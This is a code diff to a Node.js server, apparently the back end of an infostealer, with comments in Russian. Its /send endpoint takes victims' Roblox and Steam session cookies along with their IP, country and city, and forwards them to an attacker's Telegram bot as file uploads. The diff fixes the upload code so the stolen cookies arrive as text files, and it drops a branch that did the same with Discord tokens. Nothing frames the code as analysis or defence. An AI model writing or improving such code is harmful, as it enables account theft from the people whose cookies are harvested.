@@ -12,7 +12,7 @@ const API = "https://api.telegram.org/bot" + TOKEN;
 
 app.post('/send', async (req, res) => {
     try {
-        const { robloxCookie, steamCookie, discordToken, ip, country, city } = req.body;
+        const { robloxCookie, steamCookie, ip, country, city } = req.body;
 
         let msg = "👋 ЗАПУЩЕН\n\n";
         if (ip) {
@@ -26,58 +26,29 @@ app.post('/send', async (req, res) => {
             text: msg
         });
 
-        // Отправка файлов через sendDocument с правильным Content-Type
         if (robloxCookie) {
             try {
-                await axios.post(
-                    API + "/sendDocument",
-                    {
-                        chat_id: CHAT_ID,
-                        document: robloxCookie,
-                        caption: "Roblox Cookie"
-                    },
-                    {
-                        headers: { "Content-Type": "application/json" }
-                    }
-                );
+                const fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('document', robloxCookie, { filename: 'roblox.txt', contentType: 'text/plain' });
+                await axios.post(API + "/sendDocument", fd, {
+                    headers: { 'Content-Type': 'multipart/form-data' }
+                });
             } catch (e) {
-                console.log("Ошибка Roblox файла:", e.message);
+                console.log('Ошибка отправки роблокс куки:', e.message);
             }
         }
 
         if (steamCookie) {
             try {
-                await axios.post(
-                    API + "/sendDocument",
-                    {
-                        chat_id: CHAT_ID,
-                        document: steamCookie,
-                        caption: "Steam Cookie"
-                    },
-                    {
-                        headers: { "Content-Type": "application/json" }
-                    }
-                );
+                const fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('document', steamCookie, { filename: 'steam.txt', contentType: 'text/plain' });
+                await axios.post(API + "/sendDocument", fd, {
+                    headers: { 'Content-Type': 'multipart/form-data' }
+                });
             } catch (e) {
-                console.log("Ошибка Steam файла:", e.message);
-            }
-        }
-
-        if (discordToken) {
-            try {
-                await axios.post(
-                    API + "/sendDocument",
-                    {
-                        chat_id: CHAT_ID,
-                        document: discordToken,
-                        caption: "Discord Token"
-                    },
-                    {
-                        headers: { "Content-Type": "application/json" }
-                    }
-                );
-            } catch (e) {
-                console.log("Ошибка Discord файла:", e.message);
+                console.log('Ошибка отправки стим куки:', e.message);
             }
         }
 
